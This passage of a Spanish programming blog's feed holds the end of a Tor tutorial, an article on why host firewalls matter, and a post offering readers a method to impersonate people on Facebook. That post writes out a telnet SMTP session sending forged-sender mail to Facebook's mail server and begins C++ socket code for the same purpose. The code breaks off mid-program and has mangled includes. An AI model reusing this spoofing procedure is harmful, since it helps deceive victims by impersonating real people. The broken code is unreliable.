&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;31.172.30.1 – – &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18/Jul/2012:00:33:25 +0200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; “GET /image.png HTTP/1.0″ &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;695&lt;/span&gt; “-” “Wget/1.12 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;”
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Podemos ver que pedimos el archivo image.png de la dirección IP 31.172.30.1. Para verificar incluso si la IP es parte de la red Tor, podemos clickear en &amp;#8220;View the Network&amp;#8221; en la GUI Vidalia, la cual nos lista todos los nodos en la red Tor. Entre todos ellos está también el nodo con la IP 31.172.30.1 como se representa en la imagen siguiente:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;081712_1515_AchievingAn2&#34; src=&#34;https://elbauldelprogramador.com/img/2013/05/081712_1515_AchievingAn2.png&#34; width=&#34;300px&#34; height=&#34;99px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Podemos ver que el nodo Tor está ubicado en Alemania, tiene la IP 31.172.30.1, y está levantado desde hace 48 días, etc. Por lo tanto, hemos validado que el nodo es parte de la red Tor, y por lo tanto tsocks funcionó como era esperado.&lt;/p&gt;

&lt;h2 id=&#34;referencias&#34;&gt;Referencias&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;InfoSec Institute Resources&lt;/em&gt; »» &lt;a href=&#34;http://resources.infosecinstitute.com/tor-part-3/&#34; target=&#34;_blank&#34;&gt;Achieving Anonymity with Tor Part 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;(1) Tor Project&lt;/em&gt; »» &lt;a href=&#34;https://www.torproject.org/torbutton/en/design/&#34; target=&#34;_blank&#34;&gt;Torbutton Design Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Por qué nuestro PC necesita un firewall activado</title>
            <link>https://elbauldelprogramador.com/por-que-nuestro-pc-necesita-un-firewall/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/por-que-nuestro-pc-necesita-un-firewall/</guid>
            <description>&lt;p&gt;Hace poco os hablé de &lt;a href=&#34;https://elbauldelprogramador.com/por-que-gnulinux-no-es-solo-para-geeks&#34;&gt;por qué Linux no era solo para geeks&lt;/a&gt;, sacando el tema de la seguridad, en este post se habla sobre la seguridad en la red&lt;/p&gt;

&lt;p&gt;¿Por qué es necesario convencer a todo el mundo que es necesario activar un cortafuegos (Firewall) en los ordenadores que tienen acceso a internet?, ya sean de escritorio o servidores. Se podría pensar que la tarea de un firewall es obvia para cualquier usuario que posea un ordenador. Sin embargo, circulan comentarios acerca de este tema que no lo hacen del todo cierto.&lt;/p&gt;

&lt;p&gt;Podemos tomar como ejemplo el &lt;a target=&#34;_blank&#34; href=&#34;http://chakra-project.org/bbs/viewtopic.php?id=5185&#34;&gt;foro Chakra&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;También estoy en contra del uso del firewall (¿cuanta gente navega con un módem usb en linux, o desactiva el firewall del router?)&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;, ¿Qué tipo de web porno o qué tipo de script hay que visitar/ejecutar para infectarte de malware en Linux? y puesto que tal vez 3 de cada mil personas por lo general descargan y ejecutan un script sin leerlo, ¿debo tener mi ordenador llenas de este software? En serio: ¿cuantas veces ejecutaste amarok o VLC y encontraste un exploit que hizo colgarse al pc?&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;O &lt;a target=&#34;_blank&#34; href=&#34;http://www.linuxbsdos.com/2010/07/20/pclinuxos-2010-review/comment-page-2/#comments&#34;&gt;este&lt;/a&gt; otro de los fans de PCLinuxOS:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Casi todas las distros incluyen un firewall, pero está desactivado por defecto. No creo en la teoría de &amp;#8220;una única configuración del firewall arregla todo&amp;#8221;. Mis necesidades son diferentes a las vuestras. Incluyan el firewall, coloquen un icono en un lugar fácil de encontrar y dejen que nosotros hagamos el resto.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&amp;#8230;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Al principio el firewall venía habilitado, pero la mayoría de los usuarios se quejaban por ello y los desarrolladores lo desabilitaron. PErsonalmente cada usuario deberia elegir si quiere activarlo o no.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&amp;#8230;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Prefieren el icono del firewall en el escritorio para que puedan configurarlo ellos mismos basandose en sus necesidades personales.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Lo que revelan estos comentarios es que muchos en nuestra comunidad no entienden las bases de la seguridad de red. Espero que este corto artículo pueda dejar un poco más claro este tema.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;p&gt;Lo fundamental en esta discusión es comprender el papel general que desempeña un firewall en un ordenador o sistema de ordenadores. En términos simples, un firewall protege un ordenador de ataques de red. Y hay firewalls basados en host y en red. Un firewall basado en host es aquel que se ejecuta y protege a un solo dispositivo. Ese sería el que se ejecuta en un ordenador personal, ya sea sobre un sistema Linux, BSD o cualquier otro sistema operativo.&lt;/p&gt;

&lt;p&gt;Por otro lado, un firewall basado en red es aquel ejecutandose en un dispositivo al borde o en el perímetro de una red. Este dispositivo puede ser un router, un switch o un dispositivo VPN. Tu router por cable, DSL o fibra óptica está en esta categoría. El error que mucha gente comete es pensar que si tienen un firewall un uno de estos dispositvos, no necesitan otro en el ordenador personal situado detrás del router. Un mal pensamiento.&lt;/p&gt;

&lt;p&gt;En una red de ordenadores, uno de ellos permite el acceso desde el exterior, la mejor practica de seguridad requiere que cada nodo de la red tenga por sí mismo seguridad, uno que trabaja en conjunto con el firewall perimetral (y también con otras medidas de seguridad). En la jerga profesional a esta practica se la conoce como &lt;strong&gt;seguridad en profundidad (Security in-depth)&lt;/strong&gt;. Se trata de un enfoque de seguridad por capas y este enfoque no es exclusivo del mundo de la informática. Se puede observar donde quiera que se mire. Por ejemplo, supón que vives en un complejo amurallado, ¿Dejarias las puertas y las ventanas de tu casa abiertas simplemente poque tienes una cerca alrededor?, por supuesto que no. O ¿dejarías tu coche abierto simplemente porque está en un parking? Probablemente tampoco. Las razones son obvias.&lt;/p&gt;

&lt;p&gt;El mismo razonamiento y principio se debería aplicar a las redes locales. A parte del firewall perimetral, de otro ejecutandose en el dispositivo en el borde de la red (El router p.e), también deberías tener un firewall basado en host ejecutandose en tu ordenador de escritorio, servidor, netbook o notebook. Este enfoque por capas garantiza que si hay una brecha en tu defensa perimetral, si álguien &lt;em&gt;salta&lt;/em&gt; la &lt;em&gt;cerca&lt;/em&gt;, tu ordenador no estará &lt;em&gt;abierto&lt;/em&gt; para los intrusos.&lt;/p&gt;

&lt;p&gt;Por lo tanto, solo porque tu equipo esté detrás de router por cable, DSL o fibra óptica con un firewall activado no implica que podamos desabilitar el firewall basado en host (En nuestro pc). &lt;strong&gt;Security in-depth.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Los mejores firewalls son capaces de realizar inspecciones de estado completas (&lt;strong&gt;stateful inspection&lt;/strong&gt;), también llamadas &lt;strong&gt;Stateful packet Filtering&lt;/strong&gt;, la cuales dictan que todas las conexiones salientes están permitidas mientras todas las conexiones entrantes que no están relacionadas con una conexión saliente esté bloqueada.&lt;/p&gt;

&lt;p&gt;Algunas de las mejores distros linux, como Fedora, tienen un firewall habilitado fuera del nucleo. Así es como debe ser. El kernel linux tiene un firewall incorporado (Vale también par alos BSD), y hay varias interfaces gráficas para manejarlo. Lo menos que podemos esperar de los desarrolladores de las distros es que ser permita activarlo fuera del nucleo.&lt;/p&gt;

&lt;p&gt;Tracucción de : &lt;a target=&#34;_blank&#34; href=&#34;http://www.linuxbsdos.com/2011/11/21/why-your-computer-needs-a-firewall-enabled/&#34;&gt;linuxbsdos.com&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Suplantación de identidad en Facebook</title>
            <link>https://elbauldelprogramador.com/suplantacion-de-identidad-en-facebook/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/suplantacion-de-identidad-en-facebook/</guid>
            <description>&lt;p&gt;Leyendo el blog de &lt;a href=&#34;http://www.elladodelmal.com/&#34; target=&#34;_blank&#34;&gt;Chema Alonso&lt;/a&gt; me he encontrado con una entrada interesante que, aunque no he logrado realizarla al 100% quiero compartirla con vosotros para que lo intente quien quiera.&lt;/p&gt;

&lt;p&gt;El método consiste en conseguir 3 cosas:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;La dirección de correo de la persona a suplantar.&lt;/em&gt;
&lt;em&gt;Dirección de correo de facebook de la persona a quién se va a engañar.&lt;/em&gt;
&lt;em&gt;Un sistema para enviar correos SMTP&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Los pasos a seguir podéis leerlos en la entrada de &lt;a href=&#34;http://www.elladodelmal.com/2012/05/suplantacion-de-identidad-en-facebook.html&#34; target=&#34;_blank&#34;&gt;Chema: Suplantación de identidad en Facebook&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Voy a explicar lo que yo he hecho:&lt;/p&gt;

&lt;p&gt;Al principio al establecer comunicación mediante telnet por el puerto 25 (el de SMTP) y escribrir los comandos siempre recibía el siguiente error:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;strong&amp;gt;550 5.6.0 Invalid header found &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;see RFC2822 section 3.6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&amp;lt;/strong&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Tras buscar un poco el motivo descubrí que se debía a que me estaba saltando algunas cabeceras del protocolo, concretamente *From, To * y &lt;em&gt;Date.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;En resumen, todo el proceso queda como sigue:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;telnet smtpin.mx.facebook.com smtp
Trying 69.171.244.11...
Connected to smtpin.mx.facebook.com.
Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; smtpin.mx.facebook.com ESMTP
HELO client.facebook.com
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; smtpin.mx.facebook.com says HELO to xx.xxx.xxx.xx:xxxxx
MAIL from:
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; MAIL FROM accepted
RCPT to:
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; RCPT TO accepted
DATA
&lt;span class=&#34;m&#34;&gt;354&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;.  finished with &lt;span class=&#34;s2&#34;&gt;&amp;quot;rn.rn&amp;quot;&lt;/span&gt;
From: xxxxx@xxxxx.xxx
To: xxxxxx@facebook.com
Subject: Test
Date: xxx, xx xxx xxxx xx:xx:xx -xxxx

This is an example
.
&lt;span class=&#34;m&#34;&gt;450&lt;/span&gt; 4.3.2 INT-T14 http://postmaster.facebook.com/response_codes?ip&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;xx.xxx.xx.x#int Server busy, try again later
Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Pero sigo recibiendo un error (&lt;em&gt;450 4.3.2 INT-T14 &lt;a href=&#34;http://postmaster.facebook.com/response_codes?ip=xx.xxx.xx.x#int&#34;&gt;http://postmaster.facebook.com/response_codes?ip=xx.xxx.xx.x#int&lt;/a&gt; Server busy, try again later
Connection closed by foreign host&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;También probé con dos programas (sin éxito), uno en&lt;a href=&#34;https://elbauldelprogramador.com/c/&#34;&gt; C++&lt;/a&gt; y otro en &lt;a href=&#34;https://elbauldelprogramador.com/python&#34;&gt;python&lt;/a&gt; que encontré en stackoverflow:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;/sys&amp;gt;&amp;lt;sys&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;netinet&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;netdb&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#define HELO &amp;quot;HELO xxxxxx@xxxx.xxxxrn&amp;quot;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#define DATA &amp;quot;DATArn&amp;quot;&lt;/span&gt;
     &lt;span class=&#34;cp&#34;&gt;#define QUIT &amp;quot;QUITrn&amp;quot;&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//#define h_addr h_addr_list[0]&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//FILE *fin;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hostent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gethostbyname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;69.171.244.12&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;********&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;*******&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;testmailrn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wkstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;hello how r urn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/*=====Send a string to the socket=====*/&lt;/span&gt;

    &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//printf(&amp;quot;Client:%sn&amp;quot;,s);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//=====Read a string from the socket=====*/&lt;/span&gt;

    &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//printf(&amp;quot;Server:%sn&amp;quot;,buf);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/*=====MAIN=====*/&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/*=====Create Socket=====*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;perror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;opening stream socket&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;socket createdn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;cm&#34;&gt;/*=====Verify host=====*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sin_family&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;hp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gethostbyname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hostent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;%s: unknown hostn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;host_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/*=====Connect to port 25 on remote host=====*/&lt;/span&gt;
